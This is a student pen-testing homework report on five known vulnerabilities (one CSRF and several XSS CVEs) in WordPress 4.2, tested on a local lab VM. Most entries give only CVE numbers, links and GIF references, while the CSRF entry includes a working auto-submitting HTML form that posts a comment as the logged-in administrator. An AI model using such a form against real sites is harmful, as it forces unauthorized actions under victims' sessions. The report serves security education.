# Project 7 - WordPress Pen Testing

Time spent: 17 hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pen Testing Report

### 1. CSRF

- [ ] Summary: 
  - Vulnerability types: CSRF
  - Tested in version: 4.2
  - Fixed in version: 4.2.23
- [ ] GIF Walkthrough: 
 ![Walkthrough exploit 1](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/1st%20vulnerability.gif)
- [ ] Steps to recreate: 
  - Log in as Administrator
  - Post a comment to check it is taking the admin's comment
  - Submit a malicious form that goes into /wp-comments-post.php hosted on github
  
   `<html>
	      <head></head>
	      <body>
		      <form name="csrfForm" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
			       <input type="hidden" name="comment" value="I made a comment">
			       <input type="hidden" name="comment_post_ID" value="1">
			       <input type="hidden" name="comment_parent" value="0">
			       <input type="hidden" name="_wp_unfiltered_html_comment" value="2746298102">
			       <input type="submit" value="Post+Comment">
		
		      </form> 
		      <script> document.csrfForm.submit(); </script>
	      </body>
    </html>`

  - The comment "I made a comment" will be posted after going to the github link which is submitting the form
- [ ] Affected source code:
  - [Link 1](https://core.trac.wordpress.org/changeset/44842)
  - [Link 2](https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b)
  
### 2. SOME (CVE-2016-4566)

- [ ] Summary: 
  - Vulnerability types: Pupload Same Origin Method Execution (SOME)
  - Tested in version: 4.2
  - Fixed in version: 4.2.8
- [ ] GIF Walkthrough: 
 ![Walkthrough exploit 2](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/2nd%20vulnerability.gif)
- [ ] Steps to recreate: 
- [ ] Affected source code:
  - [Link 1](https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8)
  - [Link 2](https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e)

### 3. XSS (CVE-2015-3440)

- [ ] Summary: 
  - Vulnerability types: Unauthenticated Stored Cross-Site Scripting (XSS)
  - Tested in version: 4.2
  - Fixed in version: 4.2.1
- [ ] GIF Walkthrough: 
 ![Walkthrough exploit 3](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/3rd%20vulnerability.gif)
- [ ] Steps to recreate: 
- [ ] Affected source code:
  - [Link 1](https://www.exploit-db.com/exploits/36844)
  - [Link 2](https://klikki.fi/wordpress-4-2-core-stored-xss/)

### 4. XSS (CVE-2015-5734)

- [ ] Summary: 
  - Vulnerability types: Legacy Theme Preview Cross-Site Scripting (XSS)
  - Tested in version: 4.2
  - Fixed in version: 4.2.4
- [ ] GIF Walkthrough: 
 ![Walkthrough exploit 4](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/4th%20vulnerability.gif)
- [ ] Steps to recreate: 
- [ ] Affected source code:
  - [Link 1](https://core.trac.wordpress.org/changeset/33549)
  - [Link 2](https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html)

### 5. XSS (CVE-2016-1564)

- [ ] Summary: 
  - Vulnerability types: Authenticated Cross-Site Scripting (XSS)
  - Tested in version: 4.2
  - Fixed in version: 4.2.6
- [ ] GIF Walkthrough: 
 ![Walkthrough exploit 5](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/5th%20vulnerability.gif)
- [ ] Steps to recreate: 
- [ ] Affected source code:
  - [Link 1](https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with  ...
<!-- Recommended GIF Tools:
[Kap](https://getkap.co/) for macOS
[ScreenToGif](https://www.screentogif.com/) for Windows
[peek](https://github.com/phw/peek) for Linux. -->

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
